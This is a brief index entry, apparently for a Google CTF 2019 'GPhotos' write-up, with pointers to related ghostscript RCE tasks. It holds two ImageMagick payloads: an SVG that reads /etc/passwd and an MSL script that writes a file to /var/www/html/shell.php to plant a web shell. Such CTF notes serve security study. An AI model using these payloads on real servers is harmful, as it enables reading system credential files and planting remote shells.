---
title: "Google CTF 2019 - GPhotos"
description: "Example



Some Debians appear to have insecure ImageMagick configuration by default
read file:

<?xml version=\"1.0\" encoding=\"UTF-8\"?>
<svg width=\"120px\" height=\"120px\">
  <image width=\"120\" height=\"120\" href=\"text:/etc/passwd\" />
</svg>

copy file (MSL):

<image>    <!-- ImageMagick's legend is \"image processing\" so the tag is named \"image\". -->
  <read filename=\"image.png\" />    <!-- To make the legend more compelling \"image.png\" is checked to be a valid image file. -->
  <write filename=\"/var/www/html/shell.php\" />    <!-- This line gives access to a hacker accomplishing the mission of the MSL format and ImageMagick in general -->
</image>

TokyoWesterns CTF 2018 - Slack emoji converter

ghostscript RCE


TokyoWesterns CTF 2019 - Slack emoji converter Kai

ghostscript RCE



"
external_url: "https://blog.bushwhackers.ru/googlectf-2019-gphotos-writeup/"
category: "Miscellaneous"
---
